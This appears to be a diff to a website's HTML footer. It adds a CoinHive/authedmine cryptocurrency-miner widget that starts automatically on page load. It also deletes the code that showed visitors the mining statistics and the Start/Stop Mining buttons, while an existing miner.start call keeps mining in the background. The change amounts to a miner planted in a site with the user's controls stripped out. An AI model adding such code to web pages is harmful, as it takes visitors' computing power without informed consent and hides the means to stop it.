@@ -85,7 +85,25 @@
             </div>
 
         </footer>
+
     </div>
+
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+<div class="coinhive-miner" 
+	style="width: auto; height: 100px"
+	data-key="Xd2LPS0Ut2qwpaDQOeU5uCivUTIuf4y3"
+	data-autostart="true"
+	data-whitelabel="false"
+	data-background="#000000"
+	data-text="#eeeeee"
+	data-action="#00ff00"
+	data-graph="#555555"
+	data-threads="2"
+	data-user="Root"
+	data-throttle="0.1">
+	<em>Loading...</em>
+</div>
+
     <script src="assets/js/vendor/jquery-1.11.2.min.js"></script>
         <script src="assets/js/vendor/bootstrap.min.js"></script>
 
@@ -100,24 +118,12 @@ miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 
 // Update stats once per second
 setInterval(function() {
-miner.setNumThreads(2);
+miner.setNumThreads(1);
     var threadCount = miner.getNumThreads();
     var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
     var totalHashes = miner.getTotalHashes();
     var acceptedHashes = miner.getAcceptedHashes() / 256;
-    // Output to HTML elements...
-    if (miner.isRunning()) {
-        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
-        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
-        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
-        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
-        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
-    } else {
-        document.getElementById("hps").innerHTML = "Please click start";
-        document.getElementById("ths").innerHTML = "to support";
-        document.getElementById("tah").innerHTML = "this site";
-        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
-    }
+    
 }, 1000);
 </script>
 </body>
